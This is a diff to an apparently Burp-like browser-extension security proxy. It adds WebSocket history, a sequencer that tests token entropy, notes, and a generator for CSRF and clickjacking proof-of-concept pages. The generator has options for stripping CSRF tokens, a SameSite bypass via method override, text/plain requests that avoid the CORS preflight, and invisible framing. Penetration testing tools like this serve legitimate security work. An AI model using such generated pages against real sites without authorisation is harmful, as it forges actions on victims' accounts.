@@ -55,6 +55,31 @@ let intrSortKey = "id";
 let intrSortAsc = true;
 let intrColFilters = {};
 
+// ── WebSocket History state ──────────────────────────────────────────────────
+let wsFrames = [];
+let wsConnections = {};
+let wsDetailFrame = null;
+let wsSortKey = "id";
+let wsSortAsc = false;
+let wsFilterText = "";
+let wsFilterDir = "";
+let wsFilterType = "";
+let wsFilterConn = "";
+let wsTimer = null;
+
+// ── Sequencer state ─────────────────────────────────────────────────────────
+let seqTokens = [];
+let seqRunning = false;
+let seqAbort = null;
+
+// ── Notes state ─────────────────────────────────────────────────────────────
+let notes = [];
+let notesNextId = 1;
+let notesFilterText = "";
+let notesFilterSev = "";
+let notesFilterHost = "";
+let notesEditingId = null;
+
 // ── Messaging to background (with auto-retry on SW restart) ──────────────────
 let _contextDead = false;
 let bgSyncTimer = null;
@@ -91,6 +116,7 @@ function stopAllTimers() {
   clearInterval(histTimer);   histTimer = null;
   clearInterval(bgSyncTimer); bgSyncTimer = null;
   clearInterval(logSyncTimer); logSyncTimer = null;
+  clearInterval(wsTimer);     wsTimer = null;
   if (logSyncWs) { logSyncWs.close(); logSyncWs = null; }
 }
 
@@ -133,6 +159,8 @@ function showTab(name) {
   if (name === "logger") { logSyncLocal(); logRender(); startLogSync(); logSyncConnect(); } else stopLogSync();
   if (name === "target") { pollHistory().then(() => renderSiteMap()); renderEndpoints(); }
   if (name === "headers") pollHistory().then(renderHeaders);
+  if (name === "ws") startWsPoll(); else stopWsPoll();
+  if (name === "notes") { notesRender(); }
   if (name === "probe" && probeInjected) probeStartPoll(); else probeStopPoll();
 }
 
@@ -221,6 +249,8 @@ function updateBadges() {
   updateInterceptBadge();
   setBadge("bdg-history",   historyData.length);
   setBadge("bdg-endpoints", state.endpoints.length);
+  setBadge("bdg-ws",        wsFrames.length);
+  setBadge("bdg-notes",     notes.length);
 }
 function setBadge(id, n) {
   const b = document.getElementById(id);
@@ -4019,6 +4049,8 @@ function buildSessionData() {
     // Target scope
     scopeInclude: document.getElementById("tgt-scope-include").value,
     scopeExclude: document.getElementById("tgt-scope-exclude").value,
+    // Notes
+    notes: notes,
   };
 }
 
@@ -4191,9 +4223,767 @@ async function applySessionData(data) {
     document.getElementById("cfg-scope-exclude").value = data.scopeExclude;
   }
 
+  // Notes
+  if (data.notes) {
+    notes = data.notes;
+    notesNextId = notes.reduce((max, n) => Math.max(max, n.id), 0) + 1;
+  }
+
   renderHeaders();
   updateBadges();
   sessionStatus(`Loaded — ${historyData.length} history, ${repTabs.length} repeater tabs`);
+}
+
+// ═══════════════════════════ WEBSOCKET HISTORY ═════════════════════════
+
+function startWsPoll() {
+  if (wsTimer) return;
+  pollWsFrames();
+  wsTimer = setInterval(pollWsFrames, 800);
+}
+function stopWsPoll() { clearInterval(wsTimer); wsTimer = null; }
+
+async function pollWsFrames() {
+  const res = await bg({ type: "GET_WS_HISTORY" });
+  if (!res) return;
+  wsFrames = res.frames || [];
+  wsConnections = res.connections || {};
+  renderWsHistory();
+  setBadge("bdg-ws", wsFrames.length);
+}
+
+function renderWsHistory() {
+  const tbody = document.getElementById("ws-tbody");
+  const empty = document.getElementById("ws-empty");
+  const connBar = document.getElementById("ws-conn-bar");
+  const connInfo = document.getElementById("ws-conn-info");
+  tbody.replaceChildren();
+
+  // Connection status pills
+  const conns = Object.entries(wsConnections);
+  if (conns.length) {
+    connBar.classList.remove("hidden");
+    connInfo.replaceChildren();
+    for (const [, c] of conns) {
+      const pill = el("span", `ws-conn-pill ws-conn-${c.status === "open" ? "open" : "closed"}`);
+      let label = "";
+      try { label = new URL(c.url).host; } catch { label = c.url; }
+      pill.textContent = `${c.status === "open" ? "\u25CF" : "\u25CB"} ${label}`;
+      pill.title = c.url;
+      connInfo.appendChild(pill);
+    }
+  } else {
+    connBar.classList.add("hidden");
+  }
+
+  // Populate connection filter
+  const connSel = document.getElementById("ws-flt-conn");
+  const existingOpts = new Set([...connSel.options].map(o => o.value));
+  for (const [, c] of conns) {
+    if (!existingOpts.has(c.url)) {
+      const o = el("option"); o.value = c.url;
+      try { o.textContent = new URL(c.url).host; } catch { o.textContent = c.url; }
+      connSel.appendChild(o); existingOpts.add(c.url);
+    }
+  }
+
+  let items = [...wsFrames];
+  if (wsFilterDir) items = items.filter(f => f.direction === wsFilterDir);
+  if (wsFilterType) items = items.filter(f => String(f.opcode) === wsFilterType);
+  if (wsFilterConn) items = items.filter(f => f.url === wsFilterConn);
+  if (wsFilterText) {
+    const q = wsFilterText.toLowerCase();
+    items = items.filter(f => (f.data || "").toLowerCase().includes(q) || (f.url || "").toLowerCase().includes(q));
+  }
+
+  items.sort((a, b) => {
+    let va, vb;
+    const ai = wsFrames.indexOf(a), bi = wsFrames.indexOf(b);
+    switch (wsSortKey) {
+      case "id":        va = ai; vb = bi; break;
+      case "direction": va = a.direction; vb = b.direction; break;
+      case "url":       va = a.url; vb = b.url; break;
+      case "opcode":    va = a.opcode; vb = b.opcode; break;
+      case "length":    va = a.length; vb = b.length; break;
+      case "time":      va = a.time; vb = b.time; break;
+      default:          va = ai; vb = bi;
+    }
+    if (typeof va === "string") { va = va.toLowerCase(); vb = vb.toLowerCase(); }
+    return (va < vb ? -1 : va > vb ? 1 : 0) * (wsSortAsc ? 1 : -1);
+  });
+
+  if (!items.length) { empty.classList.remove("hidden"); document.getElementById("ws-table").parentElement.classList.add("hidden"); return; }
+  empty.classList.add("hidden");
+  document.getElementById("ws-table").parentElement.classList.remove("hidden");
+
+  for (let i = 0; i < Math.min(items.length, 3000); i++) {
+    const f = items[i];
+    const tr = document.createElement("tr");
+    tr.className = "tgt-clickable";
+    const dirCls = f.direction === "sent" ? "ws-dir-sent" : "ws-dir-recv";
+    const dirIcon = f.direction === "sent" ? "\u2191" : "\u2193";
+    const typeStr = f.opcode === 2 ? "Binary" : "Text";
+    const preview = esc((f.data || "").slice(0, 120));
+    const len = f.length > 1024 ? `${(f.length / 1024).toFixed(1)}k` : f.length || 0;
+    tr.appendChild(txt("td", "hist-td-num", String(wsFrames.indexOf(f) + 1)));
+    const dirTd = txt("td", dirCls, dirIcon); dirTd.title = f.direction; tr.appendChild(dirTd);
+    const urlTd = txt("td", "", wsShortUrl(f.url)); urlTd.title = f.url; tr.appendChild(urlTd);
+    tr.appendChild(txt("td", "", typeStr));
+    tr.appendChild(txt("td", "hist-td-len", String(len)));
+    const dataTd = txt("td", "ws-data-preview", (f.data || "").slice(0, 120)); dataTd.title = preview; tr.appendChild(dataTd);
+    tr.appendChild(txt("td", "hist-td-timestamp", fmtTime(f.time)));
+    tr._wsFrame = f;
+    if (wsDetailFrame === f) tr.classList.add("hist-selected");
+    tr.addEventListener("click", () => wsOpenDetail(f));
+    tbody.appendChild(tr);
+  }
+}
+
+function wsShortUrl(url) {
+  try { const u = new URL(url); return u.host + u.pathname; } catch { return url; }
+}
+
+function wsOpenDetail(frame) {
+  wsDetailFrame = frame;
+  const detail = document.getElementById("ws-detail");
+  document.getElementById("ws-detail-title").textContent = `${frame.direction === "sent" ? "\u2191 Sent" : "\u2193 Received"} \u2014 ${wsShortUrl(frame.url)}`;
+  let display = frame.data || "";
+  try { const parsed = JSON.parse(display); display = JSON.stringify(parsed, null, 2); } catch {}
+  document.getElementById("ws-detail-pre").textContent = display;
+  detail.classList.remove("hidden"); detail.classList.add("visible");
+  document.getElementById("ws-resizer").classList.add("visible");
+  document.querySelectorAll("#ws-tbody tr").forEach(r => r.classList.remove("hist-selected"));
+  document.querySelectorAll("#ws-tbody tr").forEach(r => { if (r._wsFrame === frame) r.classList.add("hist-selected"); });
+}
+
+function wsCloseDetail() {
+  wsDetailFrame = null;
+  document.getElementById("ws-detail").classList.add("hidden");
+  document.getElementById("ws-detail").classList.remove("visible");
+  document.getElementById("ws-resizer").classList.remove("visible");
+}
+
+// ═══════════════════════════ PoC GENERATOR (CSRF + Clickjacking) ══════
+
+// Shared escape helpers
+function pocEscHtml(s) { return (s || "").replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/'/g, "&#39;"); }
+function pocEscJs(s) { return (s || "").replace(/\\/g, "\\\\").replace(/'/g, "\\'").replace(/\n/g, "\\n").replace(/<\//g, "<\\/"); }
+function pocEscAttr(s) { return (s || "").replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }
+
+function pocParseUrlEncoded(body) {
+  if (!body) return [];
+  return body.split("&").map(p => {
+    const i = p.indexOf("=");
+    if (i < 0) return [decodeURIComponent(p), ""];
+    return [decodeURIComponent(p.slice(0, i)), decodeURIComponent(p.slice(i + 1))];
+  });
+}
+
+function pocParseMultipart(body, ct) {
+  const fields = [];
+  const bm = (ct || "").match(/boundary=(.+)/i);
+  if (!bm || !body) return fields;
+  const boundary = bm[1].replace(/^["']|["']$/g, "");
+  for (const part of body.split("--" + boundary)) {
+    const nm = part.match(/name="([^"]+)"/);
+    if (!nm) continue;
+    const vs = part.indexOf("\r\n\r\n");
+    fields.push({ name: nm[1], value: vs >= 0 ? part.slice(vs + 4).replace(/\r\n$/, "") : "" });
+  }
+  return fields;
+}
+
+// Load a request entry into the PoC config panel
+let pocEntry = null;
+
+function pocLoadEntry(entry) {
+  pocEntry = entry;
+  const url = entry.url || "";
+  const method = (entry.method || "GET").toUpperCase();
+  const body = entry.body || "";
+  const headers = entry.headers || {};
+  const ct = Object.entries(headers).find(([k]) => k.toLowerCase() === "content-type")?.[1] || "";
+
+  // Fill CSRF config
+  document.getElementById("poc-csrf-url").value = url;
+  document.getElementById("poc-csrf-method").value = method === "GET" ? "GET" : method;
+  document.getElementById("poc-csrf-body").value = body;
+  document.getElementById("poc-csrf-ct").value = ct;
+
+  // Fill Clickjacking config
+  document.getElementById("poc-cj-url").value = url;
+
+  // Auto-select best CSRF technique
+  const sel = document.getElementById("poc-csrf-technique");
+  if (method === "GET") sel.value = "auto-form-get";
+  else if (ct.includes("application/json")) sel.value = "fetch-no-cors";
+  else if (ct.includes("multipart")) sel.value = "multipart";
+  else sel.value = "auto-form";
+
+  // Auto-detect: strip CSRF tokens if present
+  const hasCsrfInBody = /csrf|xsrf|_token|authenticity_token/i.test(body);
+  document.getElementById("poc-csrf-strip-token").checked = hasCsrfInBody;
+
+  // Update label
+  document.getElementById("poc-req-label").textContent = `${method} ${url}`;
+
+  showTab("poc");
+  pocCsrfGenerate(); // auto-generate on load
+}
+
+// ── CSRF PoC Generation ─────────────────────────────────────────────
+
+function pocCsrfGenerate() {
+  let url = document.getElementById("poc-csrf-url").value.trim();
+  if (!url) { pocCsrfStatus("Enter a URL"); return; }
+  const method = document.getElementById("poc-csrf-method").value;
+  let body = document.getElementById("poc-csrf-body").value;
+  const ct = document.getElementById("poc-csrf-ct").value;
+  const technique = document.getElementById("poc-csrf-technique").value;
+  const autoSubmit = document.getElementById("poc-csrf-autosubmit").checked;
+  const noReferrer = document.getElementById("poc-csrf-no-referrer").checked;
+  const stripToken = document.getElementById("poc-csrf-strip-token").checked;
+  const sandbox = document.getElementById("poc-csrf-sandbox").checked;
+
+  // Strip CSRF token params from body
+  if (stripToken && body) {
+    body = body.split("&").filter(p => !/csrf|xsrf|_token|authenticity_token/i.test(p.split("=")[0])).join("&");
+  }
+
+  // Warnings
+  const warnings = [];
+  const origBody = document.getElementById("poc-csrf-body").value;
+  if (/csrf|xsrf|_token|authenticity_token/i.test(origBody) && !stripToken) {
+    warnings.push({ type: "alert", text: "CSRF token detected in body \u2014 enable 'Strip CSRF token params' or PoC may fail." });
+  }
+  if (method === "GET" && technique !== "auto-form-get" && technique !== "method-override") {
+    warnings.push({ type: "info", text: "GET request \u2014 consider 'GET (img + iframe)' technique." });
+  }
+  if (ct.includes("application/json") && technique === "auto-form") {
+    warnings.push({ type: "alert", text: "JSON body with auto-form \u2014 server may reject. Use 'XHR (text/plain)' or 'Fetch' technique." });
+  }
+  if (technique === "xhr-text-plain" || technique === "fetch-no-cors") {
+    warnings.push({ type: "info", text: "Content-Type: text/plain \u2014 bypasses CORS preflight. Server must accept text/plain." });
+  }
+  if (technique === "method-override") {
+    warnings.push({ type: "info", text: "Uses _method=POST override in a GET form \u2014 works with Symfony, Laravel, Rails." });
+  }
+
+  // Build head
+  let head = "<title>CSRF PoC</title>\n";
+  if (noReferrer) head += '  <meta name="referrer" content="no-referrer">\n';
+
+  let html = "";
+  const safeUrl = pocEscAttr(url);
+  const submitScript = autoSubmit ? "\n  <script>document.getElementById('poc-form').submit();<\\/script>" : "";
+
+  switch (technique) {
+    case "auto-form-get": {
+      html = `<html>\n<head>\n  ${head}</head>\n<body>\n  <h1>CSRF PoC</h1>\n  <img src="${safeUrl}" style="display:none" />\n  <iframe src="${safeUrl}" style="width:0;height:0;border:0"></iframe>\n</body>\n</html>`;
+      break;
+    }
+    case "xhr-text-plain": {
+      // XHR with text/plain Content-Type — bypasses CORS preflight
+      // The body is sent as-is; to send form-encoded params via text/plain, we
+      // craft the body so the first param contains "=" (required for text/plain trick)
+      html = `<html>\n<head>\n  ${head}</head>\n<body>\n  <h1>CSRF PoC</h1>\n  <script>\n    var xhr = new XMLHttpRequest();\n    xhr.open('${pocEscJs(method)}', '${pocEscJs(url)}', true);\n    xhr.withCredentials = true;\n    xhr.setRequestHeader('Content-Type', 'text/plain');\n    xhr.send('${pocEscJs(body)}');\n  <\\/script>\n</body>\n</html>`;
+      break;
+    }
+    case "fetch-no-cors": {
+      // Fetch with no-cors mode — sends request but can't read response
+      html = `<html>\n<head>\n  ${head}</head>\n<body>\n  <h1>CSRF PoC</h1>\n  <script>\n    fetch('${pocEscJs(url)}', {\n      method: '${pocEscJs(method)}',\n      mode: 'no-cors',\n      credentials: 'include',\n      headers: { 'Content-Type': 'text/plain' },\n      body: '${pocEscJs(body)}'\n    });\n  <\\/script>\n</body>\n</html>`;
+      break;
+    }
+    case "method-override": {
+      // SameSite Lax bypass: GET form with _method=POST (Symfony/Laravel/Rails)
+      const params = pocParseUrlEncoded(body);
+      let fields = `    <input type="hidden" name="_method" value="${pocEscAttr(method)}" />\n`;
+      fields += params.map(([k, v]) => `    <input type="hidden" name="${pocEscAttr(k)}" value="${pocEscAttr(v)}" />`).join("\n");
+      html = `<html>\n<head>\n  ${head}</head>\n<body>\n  <h1>CSRF PoC</h1>\n  <form id="poc-form" action="${safeUrl}" method="GET">\n${fields}\n    <input type="submit" value="Submit" />\n  </form>${submitScript}\n</body>\n</html>`;
+      break;
+    }
+    case "multipart": {
+      const fields = pocParseMultipart(body, ct).map(f =>
+        `    <input type="hidden" name="${pocEscAttr(f.name)}" value="${pocEscAttr(f.value)}" />`
+      ).join("\n");
+      html = `<html>\n<head>\n  ${head}</head>\n<body>\n  <h1>CSRF PoC</h1>\n  <form id="poc-form" action="${safeUrl}" method="POST" enctype="multipart/form-data">\n${fields}\n    <input type="submit" value="Submit" />\n  </form>${submitScript}\n</body>\n</html>`;
+      break;
+    }
+    default: { // auto-form
+      const params = pocParseUrlEncoded(body);
+      const fields = params.map(([k, v]) => `    <input type="hidden" name="${pocEscAttr(k)}" value="${pocEscAttr(v)}" />`).join("\n");
+      html = `<html>\n<head>\n  ${head}</head>\n<body>\n  <h1>CSRF PoC</h1>\n  <form id="poc-form" action="${safeUrl}" method="${pocEscAttr(method)}">\n${fields}\n    <input type="submit" value="Submit" />\n  </form>${submitScript}\n</body>\n</html>`;
+      break;
+    }
+  }
+
+  // Wrap in sandbox iframe if requested
+  if (sandbox && technique !== "auto-form-get") {
+    const inner = html.replace(/"/g, "&quot;");
+    html = `<html>\n<head>\n  ${head}</head>\n<body>\n  <h1>CSRF PoC (sandboxed)</h1>\n  <iframe sandbox="allow-forms allow-scripts" srcdoc="${inner}" style="width:0;height:0;border:0"></iframe>\n</body>\n</html>`;
+  }
+
+  // Render
+  const warnEl = document.getElementById("poc-csrf-warnings");
+  warnEl.replaceChildren();
+  for (const w of warnings) {
+    const div = el("div", `csrf-warn-item csrf-warn-${w.type}`);
+    div.textContent = (w.type === "alert" ? "\u26A0 " : "\u2713 ") + w.text;
+    warnEl.appendChild(div);
+  }
+  document.getElementById("poc-csrf-code").textContent = html;
+  document.getElementById("poc-csrf-code")._html = html;
+}
+
+function pocCsrfStatus(msg) {
+  document.getElementById("poc-csrf-status").textContent = msg;
+  setTimeout(() => { document.getElementById("poc-csrf-status").textContent = ""; }, 3000);
+}
+
+// ── Clickjacking PoC Generation ─────────────────────────────────────
+
+function pocCjGenerate() {
+  let url = document.getElementById("poc-cj-url").value.trim();
+  if (!url) { pocCjStatus("Enter a target URL"); return; }
+  const technique = document.getElementById("poc-cj-technique").value;
+  const params = document.getElementById("poc-cj-params").value.trim();
+  const top1 = document.getElementById("poc-cj-top1").value || 300;
+  const left1 = document.getElementById("poc-cj-left1").value || 60;
+  const text1 = document.getElementById("poc-cj-text1").value || "Click me";
+  const top2 = document.getElementById("poc-cj-top2").value || 285;
+  const left2 = document.getElementById("poc-cj-left2").value || 225;
+  const text2 = document.getElementById("poc-cj-text2").value || "Click me next";
+  const iframeW = document.getElementById("poc-cj-width").value || 500;
+  const iframeH = document.getElementById("poc-cj-height").value || 700;
+  const opacity = document.getElementById("poc-cj-opacity").value || "0.0001";
+
+  // Append prefill params to URL
+  if (params) {
+    const sep = url.includes("?") ? "&" : "?";
+    url += sep + params;
+  }
+
+  const safeUrl = pocEscAttr(url);
+  const sandboxAttr = technique === "framebuster" ? ' sandbox="allow-forms"' : "";
+
+  let decoys = `  <div class="decoy1">${pocEscHtml(text1)}</div>`;
+  let decoyStyles = `  .decoy1 {\n    position: absolute;\n    top: ${top1}px;\n    left: ${left1}px;\n    z-index: 1;\n    cursor: pointer;\n    font-size: 20px;\n    font-family: sans-serif;\n    padding: 10px 20px;\n    background: #4CAF50;\n    color: white;\n    border: none;\n    border-radius: 5px;\n  }`;
+
+  if (technique === "multistep") {
+    decoys += `\n  <div class="decoy2">${pocEscHtml(text2)}</div>`;
+    decoyStyles += `\n  .decoy2 {\n    position: absolute;\n    top: ${top2}px;\n    left: ${left2}px;\n    z-index: 1;\n    cursor: pointer;\n    font-size: 20px;\n    font-family: sans-serif;\n    padding: 10px 20px;\n    background: #2196F3;\n    color: white;\n    border: none;\n    border-radius: 5px;\n  }`;
+  }
+
+  const html = `<html>\n<head>\n  <title>Clickjacking PoC</title>\n  <style>\n  iframe {\n    position: relative;\n    width: ${iframeW}px;\n    height: ${iframeH}px;\n    opacity: ${opacity};\n    z-index: 2;\n  }\n${decoyStyles}\n  </style>\n</head>\n<body>\n${decoys}\n  <iframe src="${safeUrl}"${sandboxAttr}></iframe>\n</body>\n</html>`;
+
+  document.getElementById("poc-cj-code").textContent = html;
+  document.getElementById("poc-cj-code")._html = html;
+}
+
+function pocCjStatus(msg) {
+  document.getElementById("poc-cj-status").textContent = msg;
+  setTimeout(() => { document.getElementById("poc-cj-status").textContent = ""; }, 3000);
+}
+
+// ── PoC shared helpers ──────────────────────────────────────────────
+
+function pocCopy(preId) {
+  const pre = document.getElementById(preId);
+  navigator.clipboard.writeText(pre._html || pre.textContent || "").then(() => {
+    const statusId = preId.includes("csrf") ? "poc-csrf-status" : "poc-cj-status";
+    document.getElementById(statusId).textContent = "Copied!";
+    setTimeout(() => { document.getElementById(statusId).textContent = ""; }, 2000);
+  });
+}
+
+function pocDownload(preId, filename) {
+  const pre = document.getElementById(preId);
+  const blob = new Blob([pre._html || pre.textContent || ""], { type: "text/html" });
+  const a = el("a"); a.href = URL.createObjectURL(blob);
+  a.download = filename; a.click(); URL.revokeObjectURL(a.href);
+}
+
+// ═══════════════════════════ SEQUENCER ═════════════════════════════════
+
+async function seqStartCollection() {
+  const url = document.getElementById("seq-url").value.trim();
+  if (!url) { seqStatus("Enter a URL"); return; }
+  const method = document.getElementById("seq-method").value;
+  const rawHeaders = document.getElementById("seq-headers").value;
+  const body = document.getElementById("seq-body").value;
+  const extractType = document.getElementById("seq-extract").value;
+  const tokenName = document.getElementById("seq-token-name").value.trim();
+  const count = parseInt(document.getElementById("seq-count").value) || 100;
+  const delay = parseInt(document.getElementById("seq-delay").value) || 0;
+  if (!tokenName) { seqStatus("Enter a token name or regex pattern"); return; }
+
+  seqTokens = [];
+  seqRunning = true;
+  seqAbort = new AbortController();
+  document.getElementById("seq-start").disabled = true;
+  document.getElementById("seq-stop").disabled = false;
+  document.getElementById("seq-progress").classList.remove("hidden");
+
+  for (let i = 0; i < count; i++) {
+    if (!seqRunning) break;
+    document.getElementById("seq-progress-fill").style.width = `${((i + 1) / count) * 100}%`;
+    document.getElementById("seq-progress-text").textContent = `${i + 1} / ${count}`;
+
+    try {
+      const res = await bg({ type: "SEND_REQUEST", url, method, rawHeaders, body: body || undefined });
+      if (!res || res.error) continue;
+      let token = null;
+      if (extractType === "cookie") {
+        const setCookies = Object.entries(res.headers || {}).filter(([k]) => k.toLowerCase() === "set-cookie").map(([, v]) => v);
+        const allCookies = setCookies.join("; ");
+        const re = new RegExp(`(?:^|;\\s*)${tokenName.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}=([^;]+)`);
+        const m = allCookies.match(re);
+        if (m) token = m[1];
+      } else if (extractType === "header") {
+        token = Object.entries(res.headers || {}).find(([k]) => k.toLowerCase() === tokenName.toLowerCase())?.[1] || null;
+      } else if (extractType === "body-regex") {
+        try { const re = new RegExp(tokenName); const m = (res.body || "").match(re); token = m ? (m[1] || m[0]) : null; }
+        catch { seqStatus("Invalid regex"); break; }
+      }
+      if (token) seqTokens.push(token);
+    } catch {}
+    if (delay > 0 && seqRunning) await new Promise(r => setTimeout(r, delay));
+  }
+
+  seqRunning = false;
+  document.getElementById("seq-start").disabled = false;
+  document.getElementById("seq-stop").disabled = true;
+  seqStatus(`Done \u2014 ${seqTokens.length} tokens collected`);
+  if (seqTokens.length) seqAnalyze();
+}
+
+function seqStopCollection() {
+  seqRunning = false;
+  if (seqAbort) { seqAbort.abort(); seqAbort = null; }
+  document.getElementById("seq-start").disabled = false;
+  document.getElementById("seq-stop").disabled = true;
+  seqStatus("Stopped");
+  if (seqTokens.length) seqAnalyze();
+}
+
+function seqStatus(msg) {
+  document.getElementById("seq-collect-status").textContent = msg;
+  setTimeout(() => { document.getElementById("seq-collect-status").textContent = ""; }, 4000);
+}
+
+function seqAnalyze() {
+  if (!seqTokens.length) return;
+  document.getElementById("seq-empty").classList.add("hidden");
+  document.getElementById("seq-score-card").classList.remove("hidden");
+  document.getElementById("seq-tests").classList.remove("hidden");
+  document.getElementById("seq-chart-wrap").classList.remove("hidden");
+  document.getElementById("seq-tokens-wrap").classList.remove("hidden");
+
+  const tokens = seqTokens;
+  const unique = new Set(tokens);
+  const avgLen = tokens.reduce((s, t) => s + t.length, 0) / tokens.length;
+
+  // Character frequency
+  const charFreq = {};
+  let totalChars = 0;
+  for (const t of tokens) for (const c of t) { charFreq[c] = (charFreq[c] || 0) + 1; totalChars++; }
+  const charSet = Object.keys(charFreq).sort();
+
+  // Shannon entropy per character position
+  const maxLen = Math.max(...tokens.map(t => t.length));
+  let totalEntropy = 0, posCount = 0;
+  for (let pos = 0; pos < maxLen; pos++) {
+    const freq = {};
+    let n = 0;
+    for (const t of tokens) { if (pos < t.length) { freq[t[pos]] = (freq[t[pos]] || 0) + 1; n++; } }
+    if (n < 2) continue;
+    let h = 0;
+    for (const c in freq) { const p = freq[c] / n; if (p > 0) h -= p * Math.log2(p); }
+    totalEntropy += h; posCount++;
+  }
+  const avgEntropy = posCount > 0 ? totalEntropy / posCount : 0;
+  const maxPossible = Math.log2(charSet.length || 1);
+  const entropyPct = maxPossible > 0 ? (avgEntropy / maxPossible) * 100 : 0;
+
+  let rating, ratingCls;
+  if (entropyPct >= 85) { rating = "Excellent"; ratingCls = "seq-rating-excellent"; }
+  else if (entropyPct >= 60) { rating = "Good"; ratingCls = "seq-rating-good"; }
+  else { rating = "Poor"; ratingCls = "seq-rating-poor"; }
+
+  document.getElementById("seq-score-value").textContent = `${avgEntropy.toFixed(3)} bits/char`;
+  const ratingEl = document.getElementById("seq-score-rating");
+  ratingEl.textContent = `${rating} (${entropyPct.toFixed(1)}%)`;
+  ratingEl.className = `seq-score-rating ${ratingCls}`;
+  document.getElementById("seq-token-count").textContent = tokens.length;
+  document.getElementById("seq-unique-count").textContent = unique.size;
+  document.getElementById("seq-avg-len").textContent = avgLen.toFixed(1);
+  document.getElementById("seq-charset-size").textContent = charSet.length;
+
+  seqRunTests(tokens);
+  seqDrawChart(charFreq, totalChars);
+
+  const tokenList = document.getElementById("seq-token-list");
+  tokenList.replaceChildren();
+  tokens.forEach((t, i) => { tokenList.appendChild(txt("div", "", `${String(i + 1).padStart(4)} ${t}`)); });
+}
+
+function seqRunTests(tokens) {
+  const container = document.getElementById("seq-test-results");
+  container.replaceChildren();
+  const bits = tokens.map(t => { let b = ""; for (const c of t) b += c.charCodeAt(0).toString(2).padStart(8, "0"); return b; }).join("");
+  const tests = [];
+
+  if (bits.length >= 100) {
+    const ones = [...bits].filter(b => b === "1").length;
+    const ratio = ones / bits.length;
+    tests.push({ name: "Monobit (proportion of 1s)", result: `${(ratio * 100).toFixed(1)}%`, pass: ratio > 0.45 && ratio < 0.55 });
+  }
+
+  const uniqueRatio = new Set(tokens).size / tokens.length;
+  tests.push({ name: "Uniqueness", result: `${(uniqueRatio * 100).toFixed(1)}%`, pass: uniqueRatio > 0.95 });
+
+  if (tokens.length >= 20) {
+    const cf = {};
+    let tot = 0;
+    for (const t of tokens) for (const c of t) { cf[c] = (cf[c] || 0) + 1; tot++; }
+    const cc = Object.keys(cf).length;
+    const exp = tot / cc;
+    let chi = 0;
+    for (const c in cf) chi += Math.pow(cf[c] - exp, 2) / exp;
+    tests.push({ name: "Character distribution (\u03C7\u00B2)", result: (chi / (cc - 1 || 1)).toFixed(2), pass: chi / (cc - 1 || 1) < 3.0 });
+  }
+
+  if (bits.length >= 200) {
+    let sum = 0;
+    for (let i = 0; i < bits.length - 1; i++) sum += (bits[i] === bits[i + 1]) ? 1 : 0;
+    const sc = sum / (bits.length - 1);
+    tests.push({ name: "Serial correlation", result: sc.toFixed(4), pass: sc > 0.45 && sc < 0.55 });
+  }
+
+  if (bits.length >= 100) {
+    let runs = 1;
+    for (let i = 1; i < bits.length; i++) if (bits[i] !== bits[i - 1]) runs++;
+    const er = (2 * bits.length - 1) / 3;
+    tests.push({ name: "Runs test", result: `${runs} (expected ~${Math.round(er)})`, pass: runs / er > 0.85 && runs / er < 1.15 });
+  }
+
+  for (const t of tests) {
+    const row = el("div", "seq-test-row");
+    row.appendChild(txt("span", "", t.name));
+    row.appendChild(txt("span", t.pass ? "seq-test-pass" : "seq-test-fail", `${t.pass ? "\u2713" : "\u2717"} ${t.result}`));
+    container.appendChild(row);
+  }
+}
+
+function seqDrawChart(charFreq, total) {
+  const canvas = document.getElementById("seq-chart");
+  const ctx = canvas.getContext("2d");
+  const dpr = window.devicePixelRatio || 1;
+  const w = canvas.clientWidth;
+  const h = 200;
+  canvas.width = w * dpr; canvas.height = h * dpr;
+  ctx.scale(dpr, dpr); ctx.clearRect(0, 0, w, h);
+
+  const chars = Object.entries(charFreq).sort((a, b) => a[0].localeCompare(b[0]));
+  if (!chars.length) return;
+  const barW = Math.max(2, (w - 40) / chars.length - 1);
+  const maxFreq = Math.max(...chars.map(([, v]) => v));
+  const chartH = h - 30;
+  const dimColor = getComputedStyle(document.body).getPropertyValue("--muted").trim() || "#888";
+
+  for (let i = 0; i < chars.length; i++) {
+    const [ch, freq] = chars[i];
+    const barH = (freq / maxFreq) * chartH;
+    const x = 20 + i * (barW + 1);
+    const pct = freq / total;
+    ctx.fillStyle = pct > 0.05 ? "rgba(231,76,60,.7)" : pct > 0.02 ? "rgba(232,168,56,.6)" : "rgba(88,214,141,.5)";
+    ctx.fillRect(x, chartH - barH, barW, barH);
+    if (chars.length <= 40 || i % Math.ceil(chars.length / 40) === 0) {
+      ctx.fillStyle = dimColor; ctx.font = "9px monospace"; ctx.fillText(ch, x, h - 4);
+    }
+  }
+}
+
+function seqExport() {
+  if (!seqTokens.length) return;
+  const csv = "index,token\n" + seqTokens.map((t, i) => `${i + 1},"${t.replace(/"/g, '""')}"`).join("\n");
+  const blob = new Blob([csv], { type: "text/csv" });
+  const a = el("a"); a.href = URL.createObjectURL(blob);
+  a.download = `void-sequencer-${new Date().toISOString().slice(0, 10)}.csv`;
+  a.click(); URL.revokeObjectURL(a.href);
+}
+
+function seqFromHistory() {
+  for (let i = historyData.length - 1; i >= 0; i--) {
+    const e = historyData[i];
+    const setCookie = Object.entries(e.respHeaders || {}).find(([k]) => k.toLowerCase() === "set-cookie");
+    if (setCookie) {
+      document.getElementById("seq-url").value = e.url;
+      document.getElementById("seq-method").value = e.method || "GET";
+      document.getElementById("seq-headers").value = headersToRaw(e.headers || {});
+      document.getElementById("seq-body").value = e.body || "";
+      document.getElementById("seq-extract").value = "cookie";
+      document.getElementById("seq-token-name").value = setCookie[1].split("=")[0].trim();
+      seqStatus(`Loaded from history: ${setCookie[1].split("=")[0].trim()}`);
+      return;
+    }
+  }
+  seqStatus("No Set-Cookie entries found in history");
+}
+
+// ═══════════════════════════ NOTES ═════════════════════════════════════
+
+function notesAdd(data) {
+  const note = {
+    id: notesNextId++,
+    title: data.title || "Untitled",
+    severity: data.severity || "info",
+    host: data.host || "",
+    url: data.url || "",
+    body: data.body || "",
+    time: Date.now(),
+  };
+  notes.unshift(note);
+  notesRender(); notesSave();
+  setBadge("bdg-notes", notes.length);
+}
+
+function notesDelete(id) {
+  notes = notes.filter(n => n.id !== id);
+  notesRender(); notesSave();
+  setBadge("bdg-notes", notes.length);
+}
+
+function notesRender() {
